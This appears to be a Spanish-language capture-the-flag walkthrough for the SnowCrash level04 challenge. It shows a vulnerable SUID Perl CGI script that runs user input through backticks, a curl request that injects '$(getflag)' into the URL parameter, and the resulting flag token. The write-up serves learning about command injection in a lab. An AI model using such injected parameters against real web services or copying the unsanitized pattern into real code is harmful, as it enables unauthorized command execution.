1. **Buscando archivos**

    Encontramos otro archivo con permisos SUID
    ```bash
    level04@SnowCrash:~$ ll
    [...]
    -rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl*
    [...]
    ```  
    Con el comando `strings` encontramos este es un script Perl que funciona como una aplicación web CGI (Common Gateway Interface) y tiene una vulnerabilidad de `inyección de comandos`
    ```bash
    level04@SnowCrash:~$ strings level04.pl 
    #!/usr/bin/perl
    # localhost:4747
    use CGI qw{param};
    print "Content-type: text/html\n\n";
    sub x {
    $y = $_[0];
    print `echo $y 2>&1`;
    x(param("x"));
    ```   
    `localhost:4747`: Sugiere que este script se ejecuta en un servidor web local en el puerto 4747
    `Funcion vulnerable`: Define una función x que toma un argumento, lo guarda en $y
    Ejecuta el comando echo $y 2>&1 a través de backticks (`) que permiten ejecución de comandos shell

2. **Explotación**

    Esta vulnerabilidad de inyección de comandos es bastante directa de explotar. Como el script se ejecuta con los permisos del usuario flag04 (debido al bit SUID) y utiliza la entrada del usuario sin sanitizar en un comando shell, podemos inyectar nuestros propios comandos.
    - Revisamos si el servidor web esta corriendo
    ```bash
    level04@SnowCrash:~$ netstat -tuln | grep 4747
    tcp6       0      0 :::4747                 :::*                    LISTEN  
    ```  
    A continuacion inyectamos el comando `getflag`
    ```bash
    level04@SnowCrash:~$ curl 'http://localhost:4747/?x=$(getflag)'
    Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
    ``` 
    


